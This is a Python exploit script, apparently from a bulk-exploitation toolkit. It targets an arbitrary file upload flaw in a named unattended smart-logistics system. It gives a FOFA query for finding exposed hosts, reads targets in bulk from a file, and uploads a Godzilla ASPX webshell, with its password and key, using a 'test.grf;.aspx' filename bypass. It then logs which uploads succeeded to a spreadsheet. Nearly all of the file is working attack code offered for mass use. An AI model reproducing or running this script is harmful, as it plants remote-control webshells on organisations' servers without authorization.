

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork
from tools.WebShellLoder import WebShellLoder


def help():
    print('''
    fofa: "智能物流无人值守系统"
        1. 易思无人值守智能物流系统/Sys_ReportFile/ImportReport接口任意文件上传漏洞, 批量测试, 哥斯拉webshell, 
        密码:Tas9er 密钥:27 有效载荷:CShapDynamicPayload 加密器:CSHAP_AES_BASE64, 易思智能物流无人值守系统5.0
    x. 退出
    ''')

def vul_inter(url):
    w = WebShellLoder()
    data = w.readfile("GodAspx.aspx")
    headers = {
        'X-File-Name': 'test.grf',
        'User-Agent': 'Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'multipart/form-data; boundary= ----WebKitFormBoundaryxzUhGld6cusN3Alk',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    body = (
        "------WebKitFormBoundaryxzUhGld6cusN3Alk\r\n"
        f'Content-Disposition: form-data; name="file"; .filename="test.grf;.aspx"\r\n'
        "Content-Type: application/octet-stream\r\n"
        "\r\n"
        f"{data}\r\n"
        "------WebKitFormBoundaryxzUhGld6cusN3Alk--"
    )
    method = "POST"
    path = "/Sys_ReportFile/ImportReport?encode=a"
    notes = "文件上传路径于响应体"
    return (url, method, headers, body, path, notes)


def run():
    OUTDIR = "result/易思无人值守智能物流系统"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    # 获取资产目标
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))

    if num == 1:
        data = []
        for url in li:
            item = vul_inter(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}-易思无人值守智能物流系统文件上传漏洞.xlsx")

    else:
        print('bye..')
